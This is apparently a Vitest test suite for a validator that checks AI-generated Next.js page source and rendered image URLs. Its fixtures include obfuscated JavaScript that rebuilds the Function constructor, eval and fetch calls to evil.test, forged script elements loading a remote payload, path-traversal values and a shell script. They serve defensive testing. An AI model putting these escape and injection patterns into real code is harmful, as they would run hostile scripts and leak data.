import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import {
  PagePostflightError,
  approvedAssetBasename,
  assertOnlyAllowedGitPaths,
  assertPageSourceHasNoEmbeddedMedia,
  assertPageSourceMatchesSeal,
  assertRenderedImageUrls,
  hashPageSourceManifest,
  sealPageSourceTree,
} from "@/orchestrator/pagePostflight";

describe("assertOnlyAllowedGitPaths", () => {
  const allowed = ["src/app/council-run/", "public/council-run/"];

  it("returns normalized paths when every change is inside the generated page", () => {
    expect(
      assertOnlyAllowedGitPaths(
        [
          "src/app/council-run/page.tsx",
          "src\\app\\council-run\\sections\\Hero.tsx",
          "public/council-run/hero portrait.webp",
        ],
        allowed,
      ),
    ).toEqual([
      "src/app/council-run/page.tsx",
      "src/app/council-run/sections/Hero.tsx",
      "public/council-run/hero portrait.webp",
    ]);
  });

  it("rejects paths outside the two exact prefixes", () => {
    expect(() =>
      assertOnlyAllowedGitPaths(
        [
          "src/app/council-run/page.tsx",
          "src/app/council-run-evil/page.tsx",
          "package.json",
        ],
        allowed,
      ),
    ).toThrowError(PagePostflightError);

    try {
      assertOnlyAllowedGitPaths(
        ["src/app/council-run-evil/page.tsx", "package.json"],
        allowed,
      );
    } catch (error) {
      expect(error).toMatchObject({
        code: "GIT_SCOPE_VIOLATION",
        violations: ["src/app/council-run-evil/page.tsx", "package.json"],
      });
    }
  });

  it.each([
    "../package.json",
    "src/app/council-run/../../layout.tsx",
    "/tmp/page.tsx",
    "C:\\tmp\\page.tsx",
    "src/app/council-run/evil\0.tsx",
  ])("rejects non-portable or unsafe git path %s", (unsafePath) => {
    expect(() => assertOnlyAllowedGitPaths([unsafePath], allowed)).toThrowError(
      PagePostflightError,
    );
  });

  it("rejects an unsafe allowed prefix instead of widening the scope", () => {
    expect(() =>
      assertOnlyAllowedGitPaths(["package.json"], ["."]),
    ).toThrowError(PagePostflightError);
  });

  it.each([
    ["route.ts", "export async function GET() { return new Response(process.env.SECRET) }"],
    ["page.tsx", '"use server"; export default async function Page() {}'],
    ["page.tsx", 'export default function Page() { fetch("http://127.0.0.1:1") }'],
    ["page.tsx", 'const fs = require("node:fs"); export default function Page() {}'],
    ["page.tsx", 'export default function Page() { return <iframe src="https://evil.test" /> }'],
    ["payload.sh", "#!/bin/sh\ntouch /tmp/canary"],
  ])("blocks generated executable content in %s", async (filename, source) => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-exec-"));
    await fs.writeFile(path.join(root, filename), source, "utf8");

    await expect(assertPageSourceHasNoEmbeddedMedia(root)).rejects.toMatchObject({
      code: "SOURCE_EXECUTION_VIOLATION",
      violations: [filename],
    });
  });
});

describe("assertPageSourceHasNoEmbeddedMedia", () => {
  it("recursively accepts normal source files and returns portable relative paths", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-safe-"));
    await fs.mkdir(path.join(root, "sections"));
    await fs.writeFile(path.join(root, "page.tsx"), '"use client"; export default function Page() {}', "utf-8");
    await fs.writeFile(path.join(root, "sections", "Hero.tsx"), '"use client"; export function Hero() {}', "utf-8");
    await fs.writeFile(path.join(root, "styles.css"), ".root {}", "utf-8");

    await expect(assertPageSourceHasNoEmbeddedMedia(root)).resolves.toEqual([
      "page.tsx",
      "sections/Hero.tsx",
      "styles.css",
    ]);
  });

  it.each([
    "portrait.PNG",
    "photo.jpeg",
    "hero.webp",
    "vector.svg",
    "clip.mp4",
    "movie.WEBM",
    "font.woff2",
    "font.ttf",
  ])("blocks embedded media file %s", async (filename) => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-media-"));
    await fs.mkdir(path.join(root, "nested"));
    await fs.writeFile(path.join(root, "nested", filename), "not real media", "utf-8");

    await expect(assertPageSourceHasNoEmbeddedMedia(root)).rejects.toMatchObject({
      code: "SOURCE_MEDIA_VIOLATION",
      violations: [`nested/${filename}`],
    });
  });

  it("blocks file and directory symlinks without following them", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-link-"));
    const outside = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-outside-"));
    await fs.writeFile(path.join(outside, "secret.txt"), "secret", "utf-8");
    await fs.symlink(path.join(outside, "secret.txt"), path.join(root, "linked-file.tsx"));
    await fs.symlink(outside, path.join(root, "linked-directory"));

    await expect(assertPageSourceHasNoEmbeddedMedia(root)).rejects.toMatchObject({
      code: "SOURCE_SYMLINK_VIOLATION",
      violations: ["linked-directory", "linked-file.tsx"],
    });
  });

  it("blocks a page source directory that is itself a symlink", async () => {
    const target = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-root-target-"));
    const holder = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-root-link-"));
    const rootLink = path.join(holder, "page");
    await fs.symlink(target, rootLink);

    await expect(assertPageSourceHasNoEmbeddedMedia(rootLink)).rejects.toMatchObject({
      code: "SOURCE_SYMLINK_VIOLATION",
      violations: ["."],
    });
  });

  it.each([
    'export const hero = "data:image/png;base64,AAAA";',
    ".hero { background: url(blob:http://localhost/id) }",
  ])("blocks inline data/blob media in generated source", async (source) => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-inline-"));
    await fs.writeFile(path.join(root, "page.tsx"), source, "utf8");

    await expect(assertPageSourceHasNoEmbeddedMedia(root)).rejects.toMatchObject({
      code: "SOURCE_INLINE_MEDIA_VIOLATION",
      violations: ["page.tsx"],
    });
  });

  it.each([
    'import fs from "fs"; export default function Page() { return null; }',
    'import helper from "../../../lib/runStore"; export default helper;',
    'const module = import("some-package"); export default module;',
    'export { value } from "server-only";',
  ])("blocks generated imports that could escape the static page boundary", async (source) => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-import-"));
    await fs.writeFile(path.join(root, "page.tsx"), source, "utf8");

    await expect(assertPageSourceHasNoEmbeddedMedia(root)).rejects.toMatchObject({
      code: "SOURCE_EXECUTION_VIOLATION",
      violations: ["page.tsx"],
    });
  });

  it("allows a small audited package set and local modules contained by the page", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-import-safe-"));
    await fs.writeFile(
      path.join(root, "page.tsx"),
      '"use client"; import Image from "next/image"; import { motion } from "framer-motion"; import Card from "./Card"; export default function Page() { return <motion.div><Image src="/x" alt="" width={1} height={1}/><Card /></motion.div>; }',
      "utf8",
    );
    await fs.writeFile(path.join(root, "Card.tsx"), '"use client"; export default function Card() { return <div />; }', "utf8");

    await expect(assertPageSourceHasNoEmbeddedMedia(root)).resolves.toEqual([
      "Card.tsx",
      "page.tsx",
    ]);
  });

  it.each([
    '"use client"; const fs = import/*split*/("node" + ":fs"); export default function Page() { return null; }',
    '"use client"; export default function Page() { return globalThis["fet" + "ch"]("https://evil.test"); }',
    '"use client"; export default function Page() { return (() => {})["con" + "structor"]("return process")(); }',
    '"use client"; while (true) {} export default function Page() { return null; }',
    'export default function Page() { return <div />; }',
  ])("blocks AST-level generated-code bypasses", async (source) => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-ast-"));
    await fs.writeFile(path.join(root, "page.tsx"), source, "utf8");

    await expect(assertPageSourceHasNoEmbeddedMedia(root)).rejects.toMatchObject({
      code: "SOURCE_EXECUTION_VIOLATION",
      violations: ["page.tsx"],
    });
  });

  it.each([
    [
      "computed Function constructor via concat",
      '"use client"; export default function Page() { const F = (() => {})["con".concat("structor")]; return F("return glo" + "balThis")(); }',
    ],
    [
      "split globalThis and fetch",
      '"use client"; export default function Page() { const F = (() => {})["con".concat("structor")]; const root = F("return glo" + "balThis")(); return root["fet".concat("ch")]("https://evil.test"); }',
    ],
    [
      "split globalThis and document",
      '"use client"; export default function Page() { const F = (() => {})["con".concat("structor")]; const root = F("return glo" + "balThis")(); return root["docu".concat("ment")]["bo" + "dy"]; }',
    ],
    [
      "indirect eval recovered through Function",
      '"use client"; export default function Page() { const F = (() => {})["con".concat("structor")]; const run = F("return e" + "val")(); return run("2 + 2"); }',
    ],
    [
      "React createElement script construction",
      '"use client"; import { createElement } from "react"; export default function Page() { return createElement("scr" + "ipt", { src: "https://evil.test/payload.js" }); }',
    ],
    [
      "namespace React createElement script construction",
      '"use client"; import * as React from "react"; export default function Page() { return React.createElement("scr" + "ipt", { src: "https://evil.test/payload.js" }); }',
    ],
    [
      "Framer intrinsic script construction",
      '"use client"; import { motion } from "framer-motion"; export default function Page() { return <motion.script src="https://evil.test/payload.js" />; }',
    ],
    [
      "aliased Object reflection into Function constructor",
      '"use client"; export default function Page() { const proto = Object.getPrototypeOf; const descriptor = Object.getOwnPropertyDescriptor; const F = descriptor(proto(() => {}), "constructor").value; return F("return process")(); }',
    ],
    [
      "manual React element forgery",
      '"use client"; export default function Page() { const safe = <div />; return { ...safe, type: "script", props: { src: "https://evil.test/payload.js" } }; }',
    ],
    [
      "unbound browser top global",
      '"use client"; export default function Page() { const root = top; return <div>{String(root)}</div>; }',
    ],
    [
      "unbound browser open global",
      '"use client"; export default function Page() { open("https://evil.test"); return <div />; }',
    ],
    [
      "triple-slash source escape",
      '/// <reference path="../../../../lib/runStore.ts" />\n"use client"; export default function Page() { return <div />; }',
    ],
    [
      "dynamic import",
      '"use client"; export default function Page() { const load = import("framer-motion"); return <div>{String(load)}</div>; }',
    ],
  ])("blocks adversarial AST escape: %s", async (_label, source) => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-adversarial-"));
    await fs.writeFile(path.join(root, "page.tsx"), source, "utf8");

    await expect(assertPageSourceHasNoEmbeddedMedia(root)).rejects.toMatchObject({
      code: "SOURCE_EXECUTION_VIOLATION",
      violations: ["page.tsx"],
    });
  });

  it("preserves a normal interactive React landing page", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-react-safe-"));
    await fs.writeFile(
      path.join(root, "page.tsx"),
      `"use client";
import { useState, type CSSProperties } from "react";
import { motion } from "framer-motion";

const items = [
  { title: "First", body: "One" },
  { title: "Second", body: "Two" },
];
const cardStyle: CSSProperties = { padding: "1rem", borderRadius: "1rem" };

export default function Page() {
  const [openIndex, setOpenIndex] = useState<number | null>(null);
  return (
    <main>
      {items.map((item, index) => (
        <motion.button
          key={item.title}
          type="button"
          style={cardStyle}
          onClick={() => setOpenIndex(openIndex === index ? null : index)}
        >
          <strong>{item.title}</strong>
          {openIndex === index ? <span>{item.body}</span> : null}
        </motion.button>
      ))}
    </main>
  );
}`,
      "utf8",
    );

    await expect(assertPageSourceHasNoEmbeddedMedia(root)).resolves.toEqual([
      "page.tsx",
    ]);
  });

  it("allows locally bound UI names that overlap browser globals", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-shadowed-ui-"));
    await fs.writeFile(
      path.join(root, "page.tsx"),
      `"use client";
import { useState, type CSSProperties } from "react";

const glowStyle: CSSProperties = { position: "absolute" };

function Glow({ top }: { top: string }) {
  return <div style={{ ...glowStyle, top }} />;
}

export default function Page() {
  const [open, setOpen] = useState(false);
  const deadline = new Date(Date.now() + 60_000);
  deadline.setHours(deadline.getHours() + 1);
  const seconds = Math.max(0, Math.floor((deadline.getTime() - Date.now()) / 1000));
  return (
    <main>
      <Glow top="10%" />
      <button type="button" onClick={() => setOpen(!open)}>
        {open ? seconds.toLocaleString() : "Open"}
      </button>
    </main>
  );
}`,
      "utf8",
    );

    await expect(assertPageSourceHasNoEmbeddedMedia(root)).resolves.toEqual([
      "page.tsx",
    ]);
  });

  it("blocks remote CSS resources before a browser can request them", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-css-"));
    await fs.writeFile(path.join(root, "page.tsx"), '"use client"; export default function Page() { return <div />; }', "utf8");
    await fs.writeFile(path.join(root, "styles.css"), '.hero { background: url("//evil.test/a.png") }', "utf8");

    await expect(assertPageSourceHasNoEmbeddedMedia(root)).rejects.toMatchObject({
      code: "SOURCE_EXECUTION_VIOLATION",
      violations: ["styles.css"],
    });
  });

  it("seals every source file and rejects later byte or path changes", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-seal-"));
    await fs.mkdir(path.join(root, "sections"));
    await fs.writeFile(
      path.join(root, "page.tsx"),
      '"use client"; export default function Page() { return <div />; }',
      "utf8",
    );
    await fs.writeFile(
      path.join(root, "sections", "Hero.tsx"),
      '"use client"; export function Hero() { return <h1>Hello</h1>; }',
      "utf8",
    );

    const seal = await sealPageSourceTree(root);
    expect(Object.keys(seal)).toEqual(["page.tsx", "sections/Hero.tsx"]);
    await expect(assertPageSourceMatchesSeal(root, seal)).resolves.toBeUndefined();

    await fs.writeFile(
      path.join(root, "sections", "Hero.tsx"),
      '"use client"; export function Hero() { return <h1>Changed</h1>; }',
      "utf8",
    );
    await expect(assertPageSourceMatchesSeal(root, seal)).rejects.toMatchObject({
      code: "SOURCE_SNAPSHOT_VIOLATION",
    });
  });

  it("rejects malformed source seals instead of weakening comparison", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "page-postflight-invalid-seal-"));
    await fs.writeFile(
      path.join(root, "page.tsx"),
      '"use client"; export default function Page() { return <div />; }',
      "utf8",
    );

    await expect(assertPageSourceMatchesSeal(root, { "../page.tsx": "bad" })).rejects.toMatchObject({
      code: "INVALID_CONFIGURATION",
    });
  });
});

describe("assertRenderedImageUrls", () => {
  const options = {
    pageUrl: "http://localhost:4322/council-run",
    slug: "council-run",
    approvedBasenames: ["hero.webp", "portrait final.png", "שלום.svg"],
  };

  it("accepts direct relative and absolute same-origin approved assets", () => {
    expect(
      assertRenderedImageUrls(
        [
          "/council-run/hero.webp",
          "http://localhost:4322/council-run/portrait%20final.png",
          "/council-run/%D7%A9%D7%9C%D7%95%D7%9D.svg",
        ],
        options,
      ),
    ).toEqual([
      "/council-run/hero.webp",
      "/council-run/portrait final.png",
      "/council-run/שלום.svg",
    ]);
  });

  it("decodes a same-origin Next image optimizer URL", () => {
    const optimized =
      "/_next/image?url=%2Fcouncil-run%2Fhero.webp&w=1200&q=80";

    expect(assertRenderedImageUrls([optimized], options)).toEqual([
      "/council-run/hero.webp",
    ]);
  });

  it("ignores only the exact Meta telemetry pixel endpoint", () => {
    expect(
      assertRenderedImageUrls(
        [
          "https://www.facebook.com/tr/?id=123456789012345&ev=PageView&noscript=1",
          "/council-run/hero.webp",
        ],
        options,
      ),
    ).toEqual(["/council-run/hero.webp"]);

    expect(() =>
      assertRenderedImageUrls(
        ["https://www.facebook.com/assets/hero.webp?id=123456789012345&ev=PageView"],
        options,
      ),
    ).toThrowError(PagePostflightError);
  });

  it.each([
    "data:image/png;base64,AAAA",
    "blob:http://localhost:4322/abc",
    "https://images.example.com/hero.webp",
    "//images.example.com/hero.webp",
    "/other-page/hero.webp",
    "/council-run/nested/hero.webp",
    "/council-run/unapproved.webp",
    "/council-run/hero.webp?cache=1",
  ])("rejects rendered image URL %s", (imageUrl) => {
    expect(() => assertRenderedImageUrls([imageUrl], options)).toThrowError(
      PagePostflightError,
    );
  });

  it.each([
    "/_next/image?w=1200&q=80",
    "/_next/image?url=https%3A%2F%2Fimages.example.com%2Fhero.webp&w=1200&q=80",
    "/_next/image?url=data%3Aimage%2Fpng%3Bbase64%2CAAAA&w=1200&q=80",
    "/_next/image?url=%2Fother-page%2Fhero.webp&w=1200&q=80",
    "/_next/image?url=%2Fcouncil-run%2Fhero.webp&url=%2Fcouncil-run%2Fportrait%2520final.png&w=1200",
  ])("rejects unsafe or ambiguous Next optimizer URL %s", (imageUrl) => {
    expect(() => assertRenderedImageUrls([imageUrl], options)).toThrowError(
      PagePostflightError,
    );
  });

  it.each([
    "/tmp/hero.webp",
    "nested/hero.webp",
    "nested\\hero.webp",
    "../hero.webp",
    "",
  ])("rejects non-portable approved basename %s", (basename) => {
    expect(() =>
      assertRenderedImageUrls(["/council-run/hero.webp"], {
        ...options,
        approvedBasenames: [basename],
      }),
    ).toThrowError(PagePostflightError);
  });
});

describe("approvedAssetBasename", () => {
  const page = "http://127.0.0.1:4322/demo-page";
  const approved = new Set(["hero.webp", "other-hero.webp"]);

  it("resolves a direct asset URL to its exact basename", () => {
    expect(approvedAssetBasename("http://127.0.0.1:4322/demo-page/hero.webp", page, "demo-page", approved)).toBe("hero.webp");
  });

  it("resolves the target inside the Next image optimizer", () => {
    const optimized = "http://127.0.0.1:4322/_next/image?url=%2Fdemo-page%2Fhero.webp&w=828&q=75";
    expect(approvedAssetBasename(optimized, page, "demo-page", approved)).toBe("hero.webp");
  });

  it("never matches a basename that merely ends with an approved name", () => {
    expect(approvedAssetBasename("http://127.0.0.1:4322/demo-page/other-hero.webp", page, "demo-page", new Set(["hero.webp"]))).toBeNull();
    expect(approvedAssetBasename("http://127.0.0.1:4322/demo-page/other-hero.webp", page, "demo-page", approved)).toBe("other-hero.webp");
  });

  it("returns null for another slug, another origin, a direct query string or an unapproved file", () => {
    expect(approvedAssetBasename("http://127.0.0.1:4322/other-page/hero.webp", page, "demo-page", approved)).toBeNull();
    expect(approvedAssetBasename("http://evil.example/demo-page/hero.webp", page, "demo-page", approved)).toBeNull();
    expect(approvedAssetBasename("http://127.0.0.1:4322/demo-page/hero.webp?v=2", page, "demo-page", approved)).toBeNull();
    expect(approvedAssetBasename("http://127.0.0.1:4322/demo-page/missing.webp", page, "demo-page", approved)).toBeNull();
    expect(approvedAssetBasename("not a url", page, "demo-page", approved)).toBeNull();
  });
});

describe("hashPageSourceManifest", () => {
  it("is independent of key order and changes with any hash", () => {
    const a = hashPageSourceManifest({ "page.tsx": "1".repeat(64), "parts.tsx": "2".repeat(64) });
    const b = hashPageSourceManifest({ "parts.tsx": "2".repeat(64), "page.tsx": "1".repeat(64) });
    const c = hashPageSourceManifest({ "page.tsx": "1".repeat(64), "parts.tsx": "3".repeat(64) });
    expect(a).toMatch(/^[a-f0-9]{64}$/);
    expect(a).toBe(b);
    expect(a).not.toBe(c);
  });
});
